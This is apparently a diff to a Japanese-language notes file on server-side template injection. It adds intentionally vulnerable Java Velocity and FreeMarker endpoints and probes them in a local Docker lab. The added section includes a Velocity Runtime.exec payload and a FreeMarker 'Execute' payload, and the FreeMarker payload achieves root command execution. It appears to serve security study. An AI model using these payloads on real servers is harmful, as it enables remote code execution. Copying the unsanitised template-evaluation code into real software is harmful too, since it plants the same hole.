@@ -229,6 +229,146 @@ http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%
 ouc3MNd81U9v7WqfaxuT
 ```
 ### Java
+#### velocity
+`velocity.evaluate( context, w, "mystring", tpl );`の第4引数`tpl`にテンプレートを入力。   
+```java
+public static Object velocity(Request request, Response response) {
+
+
+  // Get inj parameter, exit if none
+  String inj = request.queryParams("inj");
+  if(inj == null) {
+    return "";
+  }
+
+  // Get tpl parameter
+  String tpl = request.queryParams("tpl");
+  if(tpl == null) {
+    tpl = inj;
+  }
+  else {
+    // Keep the formatting a-la-python
+    tpl = tpl.replace("%s", inj);
+  }
+  
+  String blind = request.queryParams("blind");
+
+  LogChute velocityLogChute = new NullLogChute() ;
+  VelocityEngine velocity;
+  StringWriter w;
+  try{
+    velocity = new VelocityEngine() ;
+    // Turn off logging - catch exceptions and log ourselves
+    velocity.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM, velocityLogChute) ;
+    velocity.setProperty(RuntimeConstants.INPUT_ENCODING, "UTF-8") ;
+    velocity.init() ;
+
+    VelocityContext context = new VelocityContext();
+    w = new StringWriter();
+
+    velocity.evaluate( context, w, "mystring", tpl );
+
+
+  }catch(Exception e){
+    e.printStackTrace();
+    return "";
+  }
+
+  // Return out string if not blind
+  if(blind == null){
+    return UUID.randomUUID().toString() + w.toString() + UUID.randomUUID().toString();
+  }
+  else {
+    return UUID.randomUUID().toString();
+  }
+}
+```
+以下だとどれも成功しないのでフローチャートに従えば`not vulnerable`となるが…。   
+```txt
+http://192.168.99.100:15003/velocity?inj=*
+90c94e24-7577-4c67-8c3d-0375421243ee*d28b750b-7272-40db-a44c-1ee8036ce26f
+
+http://192.168.99.100:15003/velocity?inj=${7*7}
+d8337a02-26e6-4e13-844e-2183bb404981${7*7}a58f904b-a8f3-4962-96b4-6433624f1fc3
+
+http://192.168.99.100:15003/velocity?inj={{7*7}}
+c7afdf02-9829-4da6-ae80-fe2a914af8ae{{7*7}}3d299313-456d-40ca-b9bb-ccaf03f22db6
+```
+以下を送信するとSymantecが`Java Payload attack`を検出しちゃってDockerでは試せない…。   
+```txt
+192.168.99.100:15003/velocity?inj=$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
+```
+#### freemarker
+`template = new Template("name", new StringReader(tpl),  new Configuration());`で解析してる？？`StringReader()`の中にテンプレートを入れれば良さそう。   
+```java
+public static Object freemarker(Request request, Response response) {
+
+  // Get inj parameter, exit if none
+  String inj = request.queryParams("inj");
+  if(inj == null) {
+    return "";
+  }
+
+  // Get tpl parameter
+  String tpl = request.queryParams("tpl");
+  if(tpl == null) {
+    tpl = inj;
+  }
+  else {
+    // Keep the formatting a-la-python
+    tpl = tpl.replace("%s", inj);
+  }
+
+  // Get blind parameter
+  String blind = request.queryParams("blind");
+
+  // Generate template from "inj"
+  Template template;
+  try{
+    template = new Template("name", new StringReader(tpl),  new Configuration());
+  }catch(IOException e){
+    e.printStackTrace();
+    return "";
+  }
+
+  // Write processed template to out
+  HashMap data = new HashMap();
+  StringWriter out = new StringWriter();
+  try{
+    template.process(data, out);
+  }catch(TemplateException | IOException e){
+    e.printStackTrace();
+    return "";
+  }
+
+  // Return out string if not blind
+  if(blind == null){
+    return UUID.randomUUID().toString() + out.toString() + UUID.randomUUID().toString();
+  }
+  else {
+    return UUID.randomUUID().toString();
+  }
+}
+```
+以下より、チャート的にはMakoということになるが…。   
+```txt
+http://192.168.99.100:15003/freemarker?inj=*
+3f82c00c-5a47-4dc1-bf77-c7728cbfdf31*5d62471d-c8f5-42ae-8aec-49414b00d13a
+
+http://192.168.99.100:15003/freemarker?inj=${7*7}
+be77fc54-fc2a-4829-b3c9-9511bc760b92496f88d221-1075-4e11-bf87-af0237c95883
+
+http://192.168.99.100:15003/freemarker?inj=aaaa{*comment*}bbb
+0b768b56-f00c-49c8-930c-dd94878137f9aaaa{*comment*}bbba1fd270b-cdf0-451d-a1b2-e7bcc8e95395
+
+http://192.168.99.100:15003/freemarker?inj=${%22z%22.join(%22ab%22)}
+何も返ってこない
+```
+`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`以下でRCE！   
+```txt
+http://192.168.99.100:15003/freemarker?inj=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22id%22%29+%7D
+e364a20a-dc6a-4ffe-9c3a-3a160d2f1a87 uid=0(root) gid=0(root) groups=0(root) 7820f0ba-f134-4991-bc75-2ad40f687839
+```
 ### python
 ### Ruby
 ### Node.js
